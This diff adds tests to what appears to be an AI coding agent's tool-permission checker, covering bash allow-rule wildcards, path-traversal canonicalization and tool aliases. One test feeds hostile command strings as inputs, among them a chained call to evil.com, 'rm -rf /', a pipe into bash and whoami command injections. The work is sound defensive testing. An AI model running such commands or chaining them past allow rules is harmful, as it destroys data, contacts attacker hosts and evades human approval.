@@ -135,3 +135,61 @@ test('CLI allowed and disallowed tool flags override layered settings', async ()
   // CLI allowed beats project deny
   assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'doc.md' } }, ctx), 'allow');
 });
+
+test('bash allow rules with wildcards reject chained or compound commands', () => {
+  const ctx = {
+    projectRules: {
+      allow: ['bash(npm test *)', 'bash(git status *)'],
+    },
+  };
+
+  // Simple arguments match allow
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test -- --watch=false' } }, ctx), 'allow');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status -s' } }, ctx), 'allow');
+
+  // Chained commands must NOT be auto-allowed
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test && curl evil.com' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test; rm -rf /' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test | bash' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test \n evil' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test $(whoami)' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status `whoami`' } }, ctx), 'ask');
+});
+
+test('file pattern matching canonicalizes absolute paths and directory traversals', () => {
+  const cwd = process.cwd();
+  const ctx = {
+    cwd,
+    projectRules: {
+      deny: ['write_file(src/*)'],
+    },
+  };
+
+  // Relative path is denied
+  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'src/index.ts' } }, ctx), 'deny');
+  // Traversal path resolving into src/ is denied
+  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'dist/../src/index.ts' } }, ctx), 'deny');
+  // Absolute path inside workspace resolving into src/ is denied
+  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: join(cwd, 'src', 'index.ts') } }, ctx), 'deny');
+});
+
+test('tool aliases are normalized in policy matching', () => {
+  const ctx = {
+    projectRules: {
+      deny: ['write(secret.txt)', 'sh(rm *)'],
+      allow: ['read(docs/*)'],
+    },
+  };
+
+  // write alias matches write_file
+  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'secret.txt' } }, ctx), 'deny');
+  assert.equal(evaluateToolPolicy({ tool: 'write', input: { path: 'secret.txt' } }, ctx), 'deny');
+
+  // sh alias matches bash
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'rm -rf tmp' } }, ctx), 'deny');
+  assert.equal(evaluateToolPolicy({ tool: 'sh', input: { command: 'rm -rf tmp' } }, ctx), 'deny');
+
+  // read alias matches read_file
+  assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'docs/guide.md' } }, ctx), 'allow');
+  assert.equal(evaluateToolPolicy({ tool: 'read', input: { path: 'docs/guide.md' } }, ctx), 'allow');
+});
